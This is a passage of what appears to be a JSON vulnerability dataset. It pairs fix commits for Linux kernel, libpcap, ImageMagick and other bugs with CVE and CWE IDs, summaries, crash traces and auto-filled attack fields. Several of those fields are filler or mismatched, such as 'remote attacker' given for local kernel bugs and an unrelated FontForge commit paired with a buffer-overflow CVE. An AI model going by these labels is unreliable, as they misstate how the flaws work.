002b:00007f1b78a90c58 EFLAGS: 00000246 ORIG_RAX: 0000000000000139\nRAX: ffffffffffffffda RBX: 000000000073bf00 RCX: 0000000000462e99\nRDX: 0000000000000000 RSI: 0000000020000180 RDI: 0000000000000003\nRBP: 00007f1b78a90c70 R08: 0000000000000000 R09: 0000000000000000\nR10: 0000000000000000 R11: 0000000000000246 R12: 00007f1b78a916bc\nR13: 00000000004bcefa R14: 00000000006f6fb0 R15: 0000000000000004\nModules linked in: pf(+) paride gpio_tps65218 tps65218 i2c_cht_wc ati_remote dc395x act_meta_skbtcindex act_ife ife ecdh_generic rc_xbox_dvd sky81452_regulator v4l2_fwnode leds_blinkm snd_usb_hiface comedi(C) aes_ti slhc cfi_cmdset_0020 mtd cfi_util sx8654 mdio_gpio of_mdio fixed_phy mdio_bitbang libphy alcor_pci matrix_keymap hid_uclogic usbhid scsi_transport_fc videobuf2_v4l2 videobuf2_dma_sg snd_soc_pcm179x_spi snd_soc_pcm179x_codec i2c_demux_pinctrl mdev snd_indigodj isl6405 mii enc28j60 cmac adt7316_i2c(C) adt7316(C) fmc_trivial fmc nf_reject_ipv4 authenc rc_dtt200u rtc_ds1672 dvb_usb_dibusb_mc dvb_usb_dibusb_mc_common dib3000mc dibx000_common dvb_usb_dibusb_common dvb_usb dvb_core videobuf2_common videobuf2_vmalloc videobuf2_memops regulator_haptic adf7242 mac802154 ieee802154 s5h1409 da9034_ts snd_intel8x0m wmi cx24120 usbcore sdhci_cadence sdhci_pltfm sdhci mmc_core joydev i2c_algo_bit scsi_transport_iscsi iscsi_boot_sysfs ves1820 lockd grace nfs_acl auth_rpcgss sunrp\n c\n ip_vs snd_soc_adau7002 snd_cs4281 snd_rawmidi gameport snd_opl3_lib snd_seq_device snd_hwdep snd_ac97_codec ad7418 hid_primax hid snd_soc_cs4265 snd_soc_core snd_pcm_dmaengine snd_pcm snd_timer ac97_bus snd_compress snd soundcore ti_adc108s102 eeprom_93cx6 i2c_algo_pca mlxreg_hotplug st_pressure st_sensors industrialio_triggered_buffer kfifo_buf industrialio v4l2_common videodev media snd_soc_adau_utils rc_pinnacle_grey rc_core pps_gpio leds_lm3692x nandcore ledtrig_pattern iptable_security iptable_raw iptable_mangle iptable_nat nf_nat nf_conntrack nf_defrag_ipv6 nf_defrag_ipv4 iptable_filter bpfilter ip6_vti ip_vti ip_gre ipip sit tunnel4 ip_tunnel hsr veth netdevsim vxcan batman_adv cfg80211 rfkill chnl_net caif nlmon dummy team bonding vcan bridge stp llc ip6_gre gre ip6_tunnel tunnel6 tun mousedev ppdev tpm kvm_intel kvm irqbypass crct10dif_pclmul crc32_pclmul crc32c_intel ghash_clmulni_intel aesni_intel ide_pci_generic aes_x86_64 piix crypto_simd input_leds psmouse cryp\n td\n glue_helper ide_core intel_agp serio_raw intel_gtt agpgart ata_generic i2c_piix4 pata_acpi parport_pc parport rtc_cmos floppy sch_fq_codel ip_tables x_tables sha1_ssse3 sha1_generic ipv6 [last unloaded: paride]\nDumping ftrace buffer:\n  (ftrace buffer empty)\n---[ end trace 7a818cf5f210d79e ]---\n\nIf alloc_disk fails in pf_init_units, pf->disk will be\nNULL, however in pf_detect and pf_exit, it's not check\nthis before free.It may result a NULL pointer dereference.\n\nAlso when register_blkdev failed, blk_cleanup_queue() and\nblk_mq_free_tag_set() should be called to free resources.\n\nReported-by: Hulk Robot <hulkci@huawei.com>\nFixes: 6ce59025f118 (\"paride\/pf: cleanup queues when detection fails\")\nSigned-off-by: YueHaibing <yuehaibing@huawei.com>\n\nSigned-off-by: Jens Axboe <axboe@kernel.dk>","summary":"An issue was discovered in the Linux kernel before 5.0.9. There is a NULL pointer dereference for a pf data structure if alloc_disk fails in drivers\/block\/paride\/pf.c.","commit_message_1":"fix potential null pointer dereference syzkaller report this : pf : pf version <file> , major <number> , cluster <number> , nice <number> pf : no atapi disk detected kasan : config_kasan_inline enabled kasan : gpf could be caused by null-ptr deref or user memory access general protection fault : <number> [ # <number> ] smp kasan pti cpu : <number> pid : <number> comm : syz-<file> tainted : g c <file>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"An issue was discovered in the Linux kernel before 5.0.9","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer deference for a pf data structure if alloc_disk fails","Attack Type":"remote attacker"},{"commit_id":"ceabee6c59943bdd5e1da1a6a20dc7ee5f8113a2","cve_id":"CVE-2019-15921","cwe_id":"CWE-399","commit_message":"genetlink: Fix a memory leak on error path\n\nIn genl_register_family(), when idr_alloc() fails,\nwe forget to free the memory we possibly allocate for\nfamily->attrbuf.\n\nReported-by: Hulk Robot <hulkci@huawei.com>\nFixes: 2ae0f17df1cd (\"genetlink: use idr to track families\")\nSigned-off-by: YueHaibing <yuehaibing@huawei.com>\nReviewed-by: Kirill Tkhai <ktkhai@virtuozzo.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"An issue was discovered in the Linux kernel before 5.0.6. There is a memory leak issue when idr_alloc() fails in genl_register_family() in net\/netlink\/genetlink.c.","commit_message_1":"fix a memory leak on error path in genl_register_family ( ) , when idr_alloc ( ) fails , we forget to free the memory we possibly allocate for family- > attrbuf","Vulnerability Type":"Resource Management Errors","Attack Vector":"when idr_alloc() fails in genl_register_family() in net\/netlink\/genetlink.c","Impact":"cause a denial of service","Root Cause":"caused by a memory leak when idr_alloc() fails","Attack Type":"remote attacker"},{"commit_id":"088aaf17aa79300cab14dbee2569c58cfafd7d6e","cve_id":"CVE-2019-15920","cwe_id":"CWE-416","commit_message":"cifs: Fix use-after-free in SMB2_read\n\nThere is a KASAN use-after-free:\nBUG: KASAN: use-after-free in SMB2_read+0x1136\/0x1190\nRead of size 8 at addr ffff8880b4e45e50 by task ln\/1009\n\nShould not release the 'req' because it will use in the trace.\n\nFixes: eccb4422cf97 (\"smb3: Add ftrace tracepoints for improved SMB3 debugging\")\n\nSigned-off-by: ZhangXiaoxu <zhangxiaoxu5@huawei.com>\nSigned-off-by: Steve French <stfrench@microsoft.com>\nCC: Stable <stable@vger.kernel.org> 4.18+\nReviewed-by: Pavel Shilovsky <pshilov@microsoft.com>","summary":"An issue was discovered in the Linux kernel before 5.0.10. SMB2_read in fs\/cifs\/smb2pdu.c has a use-after-free. NOTE: this was not fixed correctly in 5.0.10; see the 5.0.11 ChangeLog, which documents a memory leak.","commit_message_1":"fix use-after-free in smb2_read there is a kasan use-after-free : bug : kasan : use-after-free in smb2_read+0x1136\/0x1190 read of size <number> at addr ffff8880b4e45e50 by task ln\/<number> should not release the 'req ' because it will use in the trace","Vulnerability Type":"Use After Free","Attack Vector":"An issue was discovered in the Linux kernel","Impact":"execute arbitrary code","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"6a3eb3360667170988f8a6477f6686242061488a","cve_id":"CVE-2019-15919","cwe_id":"CWE-416","commit_message":"cifs: Fix use-after-free in SMB2_write\n\nThere is a KASAN use-after-free:\nBUG: KASAN: use-after-free in SMB2_write+0x1342\/0x1580\nRead of size 8 at addr ffff8880b6a8e450 by task ln\/4196\n\nShould not release the 'req' because it will use in the trace.\n\nFixes: eccb4422cf97 (\"smb3: Add ftrace tracepoints for improved SMB3 debugging\")\n\nSigned-off-by: ZhangXiaoxu <zhangxiaoxu5@huawei.com>\nSigned-off-by: Steve French <stfrench@microsoft.com>\nCC: Stable <stable@vger.kernel.org> 4.18+\nReviewed-by: Pavel Shilovsky <pshilov@microsoft.com>","summary":"An issue was discovered in the Linux kernel before 5.0.10. SMB2_write in fs\/cifs\/smb2pdu.c has a use-after-free.","commit_message_1":"fix use-after-free in smb2_write there is a kasan use-after-free : bug : kasan : use-after-free in smb2_write+0x1342\/0x1580 read of size <number> at addr ffff8880b6a8e450 by task ln\/<number> should not release the 'req ' because it will use in the trace","Vulnerability Type":"Use After Free","Attack Vector":"An issue was discovered in the Linux kernel","Impact":"execute arbitrary code","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"b57a55e2200ede754e4dc9cce4ba9402544b9365","cve_id":"CVE-2019-15918","cwe_id":"CWE-125","commit_message":"cifs: Fix lease buffer length error\n\nThere is a KASAN slab-out-of-bounds:\nBUG: KASAN: slab-out-of-bounds in _copy_from_iter_full+0x783\/0xaa0\nRead of size 80 at addr ffff88810c35e180 by task mount.cifs\/539\n\nCPU: 1 PID: 539 Comm: mount.cifs Not tainted 4.19 #10\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS\n            rel-1.12.0-0-ga698c8995f-prebuilt.qemu.org 04\/01\/2014\nCall Trace:\n dump_stack+0xdd\/0x12a\n print_address_description+0xa7\/0x540\n kasan_report+0x1ff\/0x550\n check_memory_region+0x2f1\/0x310\n memcpy+0x2f\/0x80\n _copy_from_iter_full+0x783\/0xaa0\n tcp_sendmsg_locked+0x1840\/0x4140\n tcp_sendmsg+0x37\/0x60\n inet_sendmsg+0x18c\/0x490\n sock_sendmsg+0xae\/0x130\n smb_send_kvec+0x29c\/0x520\n __smb_send_rqst+0x3ef\/0xc60\n smb_send_rqst+0x25a\/0x2e0\n compound_send_recv+0x9e8\/0x2af0\n cifs_send_recv+0x24\/0x30\n SMB2_open+0x35e\/0x1620\n open_shroot+0x27b\/0x490\n smb2_open_op_close+0x4e1\/0x590\n smb2_query_path_info+0x2ac\/0x650\n cifs_get_inode_info+0x1058\/0x28f0\n cifs_root_iget+0x3bb\/0xf80\n cifs_smb3_do_mount+0xe00\/0x14c0\n cifs_do_mount+0x15\/0x20\n mount_fs+0x5e\/0x290\n vfs_kern_mount+0x88\/0x460\n do_mount+0x398\/0x31e0\n ksys_mount+0xc6\/0x150\n __x64_sys_mount+0xea\/0x190\n do_syscall_64+0x122\/0x590\n entry_SYSCALL_64_after_hwframe+0x44\/0xa9\n\nIt can be reproduced by the following step:\n  1. samba configured with: server max protocol = SMB2_10\n  2. mount -o vers=default\n\nWhen parse the mount version parameter, the 'ops' and 'vals'\nwas setted to smb30,  if negotiate result is smb21, just\nupdate the 'ops' to smb21, but the 'vals' is still smb30.\nWhen add lease context, the iov_base is allocated with smb21\nops, but the iov_len is initiallited with the smb30. Because\nthe iov_len is longer than iov_base, when send the message,\ncopy array out of bounds.\n\nwe need to keep the 'ops' and 'vals' consistent.\n\nFixes: 9764c02fcbad (\"SMB3: Add support for multidialect negotiate (SMB2.1 and later)\")\nFixes: d5c7076b772a (\"smb3: add smb3.1.1 to default dialect list\")\n\nSigned-off-by: ZhangXiaoxu <zhangxiaoxu5@huawei.com>\nSigned-off-by: Steve French <stfrench@microsoft.com>\nCC: Stable <stable@vger.kernel.org>\nReviewed-by: Pavel Shilovsky <pshilov@microsoft.com>","summary":"An issue was discovered in the Linux kernel before 5.0.10. SMB2_negotiate in fs\/cifs\/smb2pdu.c has an out-of-bounds read because data structures are incompletely updated after a change from smb30 to smb21.","commit_message_1":"fix lease buffer length error there is a kasan slab-out-of-bounds : bug : kasan : slab-out-of-bounds in _copy_from_iter_full+0x783\/0xaa0 read of size <number> at addr ffff88810c35e180 by task <file>\/<number> cpu : <number> pid : <number> comm : <file> not tainted <file> # <number> hardware name : qemu standard pc ( i440fx + piix , <number> ) , bios rel-<file>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"An issue was discovered in the Linux kernel","Impact":"obtain sensitive information","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"56897b217a1d0a91c9920cb418d6b3fe922f590a","cve_id":"CVE-2019-15917","cwe_id":"CWE-416","commit_message":"Bluetooth: hci_ldisc: Postpone HCI_UART_PROTO_READY bit set in hci_uart_set_proto()\n\ntask A:                                task B:\nhci_uart_set_proto                     flush_to_ldisc\n - p->open(hu) -> h5_open  \/\/alloc h5  - receive_buf\n - set_bit HCI_UART_PROTO_READY         - tty_port_default_receive_buf\n - hci_uart_register_dev                 - tty_ldisc_receive_buf\n                                          - hci_uart_tty_receive\n\t\t\t\t           - test_bit HCI_UART_PROTO_READY\n\t\t\t\t            - h5_recv\n - clear_bit HCI_UART_PROTO_READY             while() {\n - p->open(hu) -> h5_close \/\/free h5\n\t\t\t\t              - h5_rx_3wire_hdr\n\t\t\t\t               - h5_reset()  \/\/use-after-free\n                                              }\n\nIt could use ioctl to set hci uart proto, but there is\na use-after-free issue when hci_uart_register_dev() fail in\nhci_uart_set_proto(), see stack above, fix this by setting\nHCI_UART_PROTO_READY bit only when hci_uart_register_dev()\nreturn success.\n\nReported-by: syzbot+899a33dc0fa0dbaf06a6@syzkaller.appspotmail.com\nSigned-off-by: Kefeng Wang <wangkefeng.wang@huawei.com>\nReviewed-by: Jeremy Cline <jcline@redhat.com>\nSigned-off-by: Marcel Holtmann <marcel@holtmann.org>","summary":"An issue was discovered in the Linux kernel before 5.0.5. There is a use-after-free issue when hci_uart_register_dev() fails in hci_uart_set_proto() in drivers\/bluetooth\/hci_ldisc.c.","commit_message_1":"hci_ldisc : postpone hci_uart_proto_ready bit set in hci_uart_set_proto ( ) task a : task b : hci_uart_set_proto flush_to_ldisc - p- > open ( hu ) - > h5_open \/\/alloc h5 - receive_buf - set_bit hci_uart_proto_ready - tty_port_default_receive_buf - hci_uart_register_dev - tty_ldisc_receive_buf - hci_uart_tty_receive - test_bit hci_uart_proto_ready - h5_recv - clear_bit hci_uart_proto_ready while ( ) { - p- > open ( hu ) - > h5_close \/\/free h5 - h5_rx_3wire_hdr - h5_reset ( ) \/\/use-after-free } it could use ioctl to set hci uart proto , but there is a use-after-free issue when hci_uart_register_dev ( ) fail in hci_uart_set_proto ( ) , see stack above , fix this by setting hci_uart_proto_ready bit only when hci_uart_register_dev ( ) return success","Vulnerability Type":"Use After Free","Attack Vector":"An issue was discovered in the Linux kernel","Impact":"execute arbitrary code","Root Cause":"caused by a use-after-free when hci_uart_register_dev() fails","Attack Type":"remote attacker"},{"commit_id":"c20b758c332d9a13afbbb276d30db1d183a85d43","cve_id":"CVE-2019-15903","cwe_id":"CWE-611","commit_message":"xmlparse.c: Deny internal entities closing the doctype","summary":"In libexpat before 2.2.8, crafted XML input could fool the parser into changing from DTD parsing to document parsing too early; a consecutive call to XML_GetCurrentLineNumber (or XML_GetCurrentColumnNumber) then resulted in a heap-based buffer over-read.","commit_message_1":"<file> : deny internal entity closing the doctype","Vulnerability Type":"Improper Restriction of XML External Entity Reference","Attack Vector":"By using a specially-crafted XML input","Impact":"cause a denial of service","Root Cause":"caused by a heap-based buffer over-read","Attack Type":"remote attacker"},{"commit_id":"626f751752875a0ddd74b9e217b6f4828713573c","cve_id":"CVE-2019-15785","cwe_id":"CWE-119","commit_message":" Warn users before discarding their unsaved scripts (#3852)\n\n* Warn users before discarding their unsaved scripts\n\nThis closes #3846.","summary":"FontForge 20190813 through 20190820 has a buffer overflow in PrefsUI_LoadPrefs in prefs.c.","commit_message_1":"warn user before discarding their unsaved script ( # <number> ) * warn user before discarding their unsaved script this close # <number>","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"has a buffer overflow","Attack Type":"remote attacker"},{"commit_id":"1fb254aa983bf190cfd685d40c64a480a9bafaee","cve_id":"CVE-2019-15538","cwe_id":"CWE-399","commit_message":"xfs: fix missing ILOCK unlock when xfs_setattr_nonsize fails due to EDQUOT\n\nBenjamin Moody reported to Debian that XFS partially wedges when a chgrp\nfails on account of being out of disk quota.  I ran his reproducer\nscript:\n\n# adduser dummy\n# adduser dummy plugdev\n\n# dd if=\/dev\/zero bs=1M count=100 of=test.img\n# mkfs.xfs test.img\n# mount -t xfs -o gquota test.img \/mnt\n# mkdir -p \/mnt\/dummy\n# chown -c dummy \/mnt\/dummy\n# xfs_quota -xc 'limit -g bsoft=100k bhard=100k plugdev' \/mnt\n\n(and then as user dummy)\n\n$ dd if=\/dev\/urandom bs=1M count=50 of=\/mnt\/dummy\/foo\n$ chgrp plugdev \/mnt\/dummy\/foo\n\nand saw:\n\n================================================\nWARNING: lock held when returning to user space!\n5.3.0-rc5 #rc5 Tainted: G        W\n------------------------------------------------\nchgrp\/47006 is leaving the kernel with locks still held!\n1 lock held by chgrp\/47006:\n #0: 000000006664ea2d (&xfs_nondir_ilock_class){++++}, at: xfs_ilock+0xd2\/0x290 [xfs]\n\n...which is clearly caused by xfs_setattr_nonsize failing to unlock the\nILOCK after the xfs_qm_vop_chown_reserve call fails.  Add the missing\nunlock.\n\nReported-by: benjamin.moody@gmail.com\nFixes: 253f4911f297 (\"xfs: better xfs_trans_alloc interface\")\nSigned-off-by: Darrick J. Wong <darrick.wong@oracle.com>\nReviewed-by: Dave Chinner <dchinner@redhat.com>\nTested-by: Salvatore Bonaccorso <carnil@debian.org>","summary":"An issue was discovered in xfs_setattr_nonsize in fs\/xfs\/xfs_iops.c in the Linux kernel through 5.2.9. XFS partially wedges when a chgrp fails on account of being out of disk quota. xfs_setattr_nonsize is failing to unlock the ILOCK after the xfs_qm_vop_chown_reserve call fails. This is primarily a local DoS attack vector, but it might result as well in remote DoS if the XFS filesystem is exported for instance via NFS.","commit_message_1":"fix missing ilock unlock when xfs_setattr_nonsize fails due to edquot benjamin moody reported to debian that xfs partially wedge when a chgrp fails on account of being out of disk quota","Vulnerability Type":"Resource Management Errors","Attack Vector":"By sending a specially-crafted system call","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"942c3e0aee748ea6fe97cb2c1aa5893225316174","cve_id":"CVE-2019-15296","cwe_id":"CWE-119","commit_message":"Fix a couple buffer overflows\n\nhttps:\/\/hackerone.com\/reports\/502816\nhttps:\/\/hackerone.com\/reports\/507858\n\nhttps:\/\/github.com\/videolan\/vlc\/blob\/master\/contrib\/src\/faad2\/faad2-fix-overflows.patch","summary":"An issue was discovered in Freeware Advanced Audio Decoder 2 (FAAD2) 2.8.8. The faad_resetbits function in libfaad\/bits.c is affected by a buffer overflow vulnerability. The number of bits to be read is determined by ld->buffer_size - words*4, cast to uint32. If ld->buffer_size - words*4 is negative, a buffer overflow is later performed via getdword_n(&ld->start[words], ld->bytes_left).","commit_message_1":"fix a couple buffer overflow","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a buffer overflow","Attack Type":"remote attacker"},{"commit_id":"0b661e0aa61850234b64394585cf577aac570bf4","cve_id":"CVE-2019-15166","cwe_id":"CWE-20","commit_message":"(for 4.9.3) LMP: Add some missing bounds checks\n\nIn lmp_print_data_link_subobjs(), these problems were identified\nthrough code review.\n\nMoreover:\nAdd and use tstr[].\nUpdate two tests outputs accordingly.","summary":"lmp_print_data_link_subobjs() in print-lmp.c in tcpdump before 4.9.3 lacks certain bounds checks.","commit_message_1":"add some missing bound check in lmp_print_data_link_subobjs ( ) , these problem were identified through code review","Vulnerability Type":"Improper Input Validation","Attack Vector":"By sending specially-crafted data","Impact":"overflow a buffer and cause the application to crash","Root Cause":"caused by improper bounds checking by the lmp_print_data_link_subobjs function","Attack Type":"remote attacker"},{"commit_id":"a5a36d9e82dde7265e38fe1f87b7f11c461c29f6","cve_id":"CVE-2019-15165","cwe_id":"CWE-20","commit_message":"Fix some format warnings.","summary":"sf-pcapng.c in libpcap before 1.9.1 does not properly validate the PHB header length before allocating memory.","commit_message_1":"fix some format warning","Vulnerability Type":"Improper Input Validation","Attack Vector":"sf-pcapng.c in libpcap before 1.9.1 does not properly validate the PHB header length","Impact":"cause a denial of service","Root Cause":"does not properly validate the phb header length before allocating memory","Attack Type":"remote attacker"},{"commit_id":"33834cb2a4d035b52aa2a26742f832a112e90a0a","cve_id":"CVE-2019-15164","cwe_id":"CWE-918","commit_message":"In the open request, reject capture sources that are URLs.\n\nYou shouldn't be able to ask a server to open a remote device on some\n*other* server; just open it yourself.\n\nThis addresses Include Security issue F13: [libpcap] Remote Packet\nCapture Daemon Allows Opening Capture URLs.","summary":"rpcapd\/daemon.c in libpcap before 1.9.1 allows SSRF because a URL may be provided as a capture source.","commit_message_1":"in the open request , reject capture source that are url","Vulnerability Type":"Server-Side Request Forgery (SSRF)","Attack Vector":"By using a specially-crafted argument","Impact":"conduct an SSRF attack","Root Cause":"caused by an error","Attack Type":"attacker"},{"commit_id":"437b273761adedcbd880f714bfa44afeec186a31","cve_id":"CVE-2019-15163","cwe_id":"CWE-476","commit_message":"Don't crash if crypt() fails.\n\nIt can fail, so make sure it doesn't before comparing its result with\nthe password.\n\nThis addresses Include Security issue F12: [libpcap] Remote Packet\nCapture Daemon Null Pointer Dereference Denial of Service.","summary":"rpcapd\/daemon.c in libpcap before 1.9.1 allows attackers to cause a denial of service (NULL pointer dereference and daemon crash) if a crypt() call fails.","commit_message_1":"do n't crash if crypt ( ) fails","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"a crypt() call fails","Impact":"cause a denial of service ( pointer dereference and daemon crash ) if a crypt ( ) call fails","Root Cause":"caused by a NULL pointer dereference","Attack Type":"attacker"},{"commit_id":"484d60cbf7ca4ec758c3cbb8a82d68b244a78d58","cve_id":"CVE-2019-15162","cwe_id":"CWE-345","commit_message":"On UN*X, don't tell the client why authentication failed.\n\n\"no such user\" tells the client that the user ID isn't valid and,\ntherefore, that it needn't bother trying to do password cracking for\nthat user ID; just saying that the authentication failed dosn't give\nthem that hint.\n\nThis resolves the third problem in Include Security issue F11: [libpcap]\nRemote Packet Capture Daemon Multiple Authentication Improvements.\n\nThe Windows LogonUser() API returns ERROR_LOGON_FAILURE for both cases,\nso the Windows code doesn't have this issue.  Just return the same\n\"Authentication failed\" message on Windows to the user.\n\nFor various authentication failures *other* than \"no such user\" and\n\"password not valid\", log a message, as there's a problem that may need\ndebugging.  We don't need to tell the end user what the problem is, as\nthey may not bother reporting it and, even if they do, they may not give\nthe full error message.","summary":"rpcapd\/daemon.c in libpcap before 1.9.1 on non-Windows platforms provides details about why authentication failed, which might make it easier for attackers to enumerate valid usernames.","commit_message_1":"on un * x , do n't tell the client why authentication failed","Vulnerability Type":"Insufficient Verification of Data Authenticity","Attack Vector":"obtain sensitive information","Impact":"enumerate valid usernames","Root Cause":"provides details about why authentication failed","Attack Type":"remote attacker"},{"commit_id":"617b12c0339db4891d117b661982126c495439ea","cve_id":"CVE-2019-15161","cwe_id":"CWE-20","commit_message":"Calculate the reply payload length in a local variable.\n\nUsing the same variable for the remaining request length and the reply\nlength is confusing at best and can cause errors at worst (if the\nrequest had extra stuff at the end, so that the variable is non-zero).\n\nThis addresses Include Security issue I8: [libpcap] Remote Packet\nCapture Daemon Parameter Reuse.","summary":"rpcapd\/daemon.c in libpcap before 1.9.1 mishandles certain length values because of reuse of a variable. This may open up an attack vector involving extra data at the end of a request.","commit_message_1":"calculate the reply payload length in a local variable","Vulnerability Type":"Improper Input Validation","Attack Vector":"involving extra data at the end of a request","Impact":"bypass security restrictions","Root Cause":"caused by the improper handling of certain length values because of reuse of a variable by rpcapd\/daemon.c","Attack Type":"remote attacker"},{"commit_id":"341f12cd5b97ab419e53853ca00176457c9f1681","cve_id":"CVE-2019-15148","cwe_id":"CWE-787","commit_message":"fixed many security issues with the too crude mp4 reader","summary":"GoPro GPMF-parser 1.2.2 has an out-of-bounds write in OpenMP4Source in demo\/GPMF_mp4reader.c.","commit_message_1":"fixed many security issue with the too crude mp4 reader","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"3c53413eb544cc567309b4c86485eae43e956112","cve_id":"CVE-2019-15141","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1560","summary":"WriteTIFFImage in coders\/tiff.c in ImageMagick 7.0.8-43 Q16 allows attackers to cause a denial-of-service (application crash resulting from a heap-based buffer over-read) via a crafted TIFF image file, related to TIFFRewriteDirectory, TIFFWriteDirectory, TIFFWriteDirectorySec, and TIFFWriteDirectoryTagColormap in tif_dirwrite.c of LibTIFF. NOTE: this occurs because of an incomplete fix for CVE-2019-11597.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted tiff image file , related to tiffrewritedirectory , tiffwritedirectory , tiffwritedirectorysec , and tiffwritedirectoryt","Impact":"cause a denial - of - service ( application crash resulting from a heap - based buffer over - read )","Root Cause":"caused by a heap-based buffer over-read","Attack Type":"remote attacker"},{"commit_id":"f7206618d27c2e69d977abf40e3035a33e5f6be0","cve_id":"CVE-2019-15140","cwe_id":"CWE-416","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1554","summary":"coders\/mat.c in ImageMagick 7.0.8-43 Q16 allows remote attackers to cause a denial of service (use-after-free and application crash) or possibly have unspecified other impact by crafting a Matlab image file that is mishandled in ReadImage in MagickCore\/constitute.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Use After Free","Attack Vector":"by crafting a matlab image file that is mishandled in readimage in magickcore \/ constitute . c","Impact":"cause a denial of service ( use - after - free and application crash ) or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"c78993d138bf480ab4652b5a48379d4ff75ba5f7","cve_id":"CVE-2019-15139","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1553","summary":"The XWD image (X Window System window dumping file) parsing component in ImageMagick 7.0.8-41 Q16 allows attackers to cause a denial-of-service (application crash resulting from an out-of-bounds Read) in ReadXWDImage in coders\/xwd.c by crafting a corrupted XWD image file, a different vulnerability than CVE-2019-11472.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"by crafting a corrupted xwd image file , a different vulnerability than cve - 2019 - 11472","Impact":"cause a denial - of - service ( application crash resulting from an out - of - bounds read ) in readxwdimage in coders \/ xwd . c","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"c09581a52765a85f19fc35340127396d5e3379cc","cve_id":"CVE-2019-15090","cwe_id":"CWE-125","commit_message":"scsi: qedi: remove memset\/memcpy to nfunc and use func instead\n\nKASAN reports this:\n\nBUG: KASAN: global-out-of-bounds in qedi_dbg_err+0xda\/0x330 [qedi]\nRead of size 31 at addr ffffffffc12b0ae0 by task syz-executor.0\/2429\n\nCPU: 0 PID: 2429 Comm: syz-executor.0 Not tainted 5.0.0-rc7+ #45\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04\/01\/2014\nCall Trace:\n __dump_stack lib\/dump_stack.c:77 [inline]\n dump_stack+0xfa\/0x1ce lib\/dump_stack.c:113\n print_address_description+0x1c4\/0x270 mm\/kasan\/report.c:187\n kasan_report+0x149\/0x18d mm\/kasan\/report.c:317\n memcpy+0x1f\/0x50 mm\/kasan\/common.c:130\n qedi_dbg_err+0xda\/0x330 [qedi]\n ? 0xffffffffc12d0000\n qedi_init+0x118\/0x1000 [qedi]\n ? 0xffffffffc12d0000\n ? 0xffffffffc12d0000\n ? 0xffffffffc12d0000\n do_one_initcall+0xfa\/0x5ca init\/main.c:887\n do_init_module+0x204\/0x5f6 kernel\/module.c:3460\n load_module+0x66b2\/0x8570 kernel\/module.c:3808\n __do_sys_finit_module+0x238\/0x2a0 kernel\/module.c:3902\n do_syscall_64+0x147\/0x600 arch\/x86\/entry\/common.c:290\n entry_SYSCALL_64_after_hwframe+0x49\/0xbe\nRIP: 0033:0x462e99\nCode: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48\nRSP: 002b:00007f2d57e55c58 EFLAGS: 00000246 ORIG_RAX: 0000000000000139\nRAX: ffffffffffffffda RBX: 000000000073bfa0 RCX: 0000000000462e99\nRDX: 0000000000000000 RSI: 00000000200003c0 RDI: 0000000000000003\nRBP: 00007f2d57e55c70 R08: 0000000000000000 R09: 0000000000000000\nR10: 0000000000000000 R11: 0000000000000246 R12: 00007f2d57e566bc\nR13: 00000000004bcefb R14: 00000000006f7030 R15: 0000000000000004\n\nThe buggy address belongs to the variable:\n __func__.67584+0x0\/0xffffffffffffd520 [qedi]\n\nMemory state around the buggy address:\n ffffffffc12b0980: fa fa fa fa 00 04 fa fa fa fa fa fa 00 00 05 fa\n ffffffffc12b0a00: fa fa fa fa 00 00 04 fa fa fa fa fa 00 05 fa fa\n> ffffffffc12b0a80: fa fa fa fa 00 06 fa fa fa fa fa fa 00 02 fa fa\n                                                          ^\n ffffffffc12b0b00: fa fa fa fa 00 00 04 fa fa fa fa fa 00 00 03 fa\n ffffffffc12b0b80: fa fa fa fa 00 00 02 fa fa fa fa fa 00 00 04 fa\n\nCurrently the qedi_dbg_* family of functions can overrun the end of the\nsource string if it is less than the destination buffer length because of\nthe use of a fixed sized memcpy. Remove the memset\/memcpy calls to nfunc\nand just use func instead as it is always a null terminated string.\n\nReported-by: Hulk Robot <hulkci@huawei.com>\nFixes: ace7f46ba5fd (\"scsi: qedi: Add QLogic FastLinQ offload iSCSI driver framework.\")\nSigned-off-by: YueHaibing <yuehaibing@huawei.com>\nReviewed-by: Dan Carpenter <dan.carpenter@oracle.com>\nSigned-off-by: Martin K. Petersen <martin.petersen@oracle.com>","summary":"An issue was discovered in drivers\/scsi\/qedi\/qedi_dbg.c in the Linux kernel before 5.1.12. In the qedi_dbg_* family of functions, there is an 